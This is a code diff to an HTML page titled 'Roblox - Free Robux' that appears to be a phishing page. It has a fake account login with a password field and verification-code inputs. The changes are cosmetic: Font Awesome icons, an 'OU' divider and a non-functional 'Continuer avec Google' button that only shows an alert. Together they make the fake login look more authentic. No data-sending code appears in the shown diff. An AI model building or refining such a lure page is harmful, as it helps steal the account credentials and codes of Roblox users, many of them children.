@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Roblox - Free Robux</title>
+    <!-- Font Awesome pour les icônes -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
     <style>
         * {
             box-sizing: border-box;
@@ -279,14 +281,22 @@
             transform: translateY(-50%);
             background: none;
             border: none;
-            color: #55585e;
+            color: #777b80;
             font-size: 20px;
             cursor: pointer;
             padding: 4px;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .input-group .password-toggle:hover {
             color: #ffffff;
+        }
+
+        .input-group .password-toggle i {
+            font-size: 20px;
         }
 
         .error-msg {
@@ -361,26 +371,69 @@
             }
         }
 
-        .forgot-links {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 14px;
-            color: #55585e;
+        /* =========================
+           BOUTON GOOGLE (décoratif)
+        ========================= */
+        .btn-google {
+            width: 100%;
+            height: 56px;
+            border: 1px solid #2a2d30;
+            border-radius: 16px;
+            background: transparent;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s ease;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 12px;
         }
 
-        .forgot-links a {
-            color: #00b878;
-            text-decoration: none;
+        .btn-google:hover {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: #3a3d40;
+        }
+
+        .btn-google:active {
+            transform: scale(0.99);
+        }
+
+        .btn-google svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .btn-google .google-text {
+            color: #ffffff;
+        }
+
+        /* =========================
+           SÉPARATEUR
+        ========================= */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 16px 0 10px 0;
+            color: #2a2d30;
+            font-size: 13px;
             font-weight: 500;
         }
 
-        .forgot-links a:hover {
-            text-decoration: underline;
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #2a2d30;
         }
 
-        .forgot-links .sep {
-            color: #2a2d30;
-            margin: 0 8px;
+        .divider span {
+            padding: 0 16px;
+            color: #55585e;
         }
 
         /* =========================
@@ -404,6 +457,28 @@
             font-size: 17px;
             color: #777b80;
             margin-top: 2px;
+        }
+
+        .forgot-links {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #55585e;
+        }
+
+        .forgot-links a {
+            color: #00b878;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-links a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-links .sep {
+            color: #2a2d30;
+            margin: 0 8px;
         }
 
         /* =========================
@@ -532,6 +607,11 @@
                 font-size: 18px;
                 border-radius: 14px;
             }
+            .btn-google {
+                height: 50px;
+                font-size: 15px;
+                border-radius: 14px;
+            }
             .code-input-group input {
                 width: 48px;
                 height: 56px;
@@ -576,6 +656,15 @@
                 height: 48px;
                 font-size: 16px;
                 border-radius: 12px;
+            }
+            .btn-google {
+                height: 44px;
+                font-size: 14px;
+                border-radius: 12px;
+            }
+            .btn-google svg {
+                width: 16px;
+                height: 16px;
             }
             .code-input-group input {
                 width: 40px;
@@ -696,8 +785,8 @@
                     autocomplete="off"
                     style="margin-bottom:0;"
                     />
-                    <button type="button" class="password-toggle" id="togglePassword">
-                        <i id="eyeIcon" style="font-style:normal;">👁️</i>
+                    <button type="button" class="password-toggle" id="togglePassword" aria-label="Afficher/masquer le mot de passe">
+                        <i class="fas fa-eye" id="eyeIcon"></i>
                     </button>
                 </div>
 
@@ -709,13 +798,29 @@
                         <span class="spinner" id="spinner2"></span>
                     </span>
                 </button>
-
-                <div class="forgot-links">
-                    <a href="#">Forgot password?</a>
-                    <span class="sep">·</span>
-                    <a href="#">Sign up</a>
-                </div>
             </form>
+
+            <!-- Séparateur "OU" -->
+            <div class="divider">
+                <span>OU</span>
+            </div>
+
+            <!-- Bouton Google (décoratif) -->
+            <button class="btn-google" onclick="alert('Cette fonctionnalité est temporairement indisponible.')">
+                <svg viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.69c-.29 1.5-1.14 2.77-2.4 3.61v3h3.84c2.25-2.07 3.61-5.12 3.61-8.46z"/>
+                    <path fill="#34A853" d="M12 24c3.24 0 5.97-1.08 7.96-2.91l-3.84-3c-1.06.72-2.42 1.16-4.12 1.16-3.17 0-5.85-2.14-6.81-5.02H1.24v3.1A11.997 11.997 0 0012 24z"/>
+                    <path fill="#FBBC05" d="M5.19 14.23c-.25-.72-.39-1.5-.39-2.23s.14-1.51.39-2.23V6.67H1.24A11.997 11.997 0 000 12c0 1.92.45 3.74 1.24 5.33l3.95-3.1z"/>
+                    <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.44-3.44C17.96 1.19 15.24 0 12 0 7.33 0 3.28 2.67 1.24 6.67l3.95 3.1c.96-2.88 3.64-5.02 6.81-5.02z"/>
+                </svg>
+                <span class="google-text">Continuer avec Google</span>
+            </button>
+
+            <div class="forgot-links">
+                <a href="#">Forgot password?</a>
+                <span class="sep">·</span>
+                <a href="#">Sign up</a>
+            </div>
         </div>
 
         <!-- ============================================================
@@ -820,7 +925,7 @@
         });
 
         // ============================================================
-        // TOGGLE PASSWORD
+        // TOGGLE PASSWORD (avec Font Awesome)
         // ============================================================
         const togglePassword = document.getElementById('togglePassword');
         const passwordInput = document.getElementById('password');
@@ -831,7 +936,7 @@
         togglePassword.addEventListener('click', function() {
             isPasswordVisible = !isPasswordVisible;
             passwordInput.type = isPasswordVisible ? 'text' : 'password';
-            eyeIcon.textContent = isPasswordVisible ? '🙈' : '👁️';
+            eyeIcon.className = isPasswordVisible ? 'fas fa-eye-slash' : 'fas fa-eye';
         });
 
         // ============================================================
